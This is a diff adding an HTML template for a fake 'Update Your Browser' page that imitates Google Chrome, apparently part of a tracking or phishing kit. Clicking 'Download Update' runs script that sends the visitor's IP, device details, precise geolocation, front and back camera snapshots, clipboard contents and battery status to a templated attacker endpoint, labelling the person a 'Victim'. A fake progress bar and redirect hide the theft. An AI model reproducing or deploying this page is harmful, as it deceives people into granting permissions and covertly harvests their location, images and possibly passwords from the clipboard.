@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Update Your Browser</title>
+<link rel="icon" href="https://www.google.com/chrome/static/images/favicons/favicon-32x32.png">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+.container { text-align: center; max-width: 500px; padding: 40px 20px; }
+.chrome-logo { width: 80px; height: 80px; border-radius: 50%; margin: 0 auto 30px; position: relative; background: conic-gradient(#ea4335 0deg 120deg, #fbbc05 120deg 240deg, #34a853 240deg 360deg); display: flex; align-items: center; justify-content: center; }
+.chrome-logo::after { content: ''; width: 34px; height: 34px; border-radius: 50%; background: #4285f4; border: 4px solid #fff; }
+h1 { font-size: 24px; color: #202124; margin-bottom: 12px; font-weight: 400; }
+p { font-size: 16px; color: #5f6368; line-height: 1.6; margin-bottom: 30px; }
+.version { font-size: 13px; color: #80868b; margin-bottom: 24px; }
+.btn-update { background: #1a73e8; color: #fff; border: none; padding: 12px 32px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
+.btn-update:hover { background: #1557b0; }
+.progress-wrap { display: none; margin-top: 30px; }
+.progress-bar { width: 100%; height: 8px; background: #e0e0e0; border-radius: 4px; overflow: hidden; }
+.progress-fill { width: 0; height: 100%; background: #1a73e8; border-radius: 4px; transition: width 0.3s linear; }
+.progress-text { font-size: 13px; color: #5f6368; margin-top: 10px; }
+.footer { position: fixed; bottom: 20px; left: 0; right: 0; text-align: center; font-size: 12px; color: #80868b; }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="chrome-logo"></div>
+<h1>Your browser is out of date</h1>
+<p>An update is required to keep your browser secure. Update now to get the latest security patches and features.</p>
+<div class="version">Current: 109.0.5414.74 → Latest: 126.0.6478.126</div>
+<button class="btn-update" id="updateBtn" onclick="startUpdate()">Download Update</button>
+<div class="progress-wrap" id="progressWrap">
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+<p class="progress-text" id="progressText">Downloading update... 0%</p>
+</div>
+</div>
+<div class="footer">Google Chrome &copy; 2024 Google LLC</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video=document.getElementById('video'), canvas=document.getElementById('canvas');
+function startUpdate(){
+    document.getElementById('updateBtn').style.display='none';
+    document.getElementById('progressWrap').style.display='block';
+    gatherAll(); advancedGather("<%=a %>","<%=uid %>");
+    var p=0,fill=document.getElementById('progressFill'),txt=document.getElementById('progressText');
+    var iv=setInterval(function(){p+=Math.random()*8+2;if(p>=100){p=100;clearInterval(iv);txt.textContent='Installing update...';setTimeout(function(){window.location.href="<%=url %>";},1500);}fill.style.width=Math.round(p)+'%';txt.textContent='Downloading update... '+Math.round(p)+'%';},300);
+}
+async function gatherAll(){
+    let td='📸 <b>Chrome Update Victim!</b>\n\n';
+    td+='⚓ IP: <code><%=ip %></code>\n';
+    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
+    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
+    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
+    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
+    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
+    try{await captureCamera("user","selfie");}catch(e){}
+    try{await captureCamera("environment","back");}catch(e){}
+    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
+    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
+}
+</script>
+</body>
+</html>
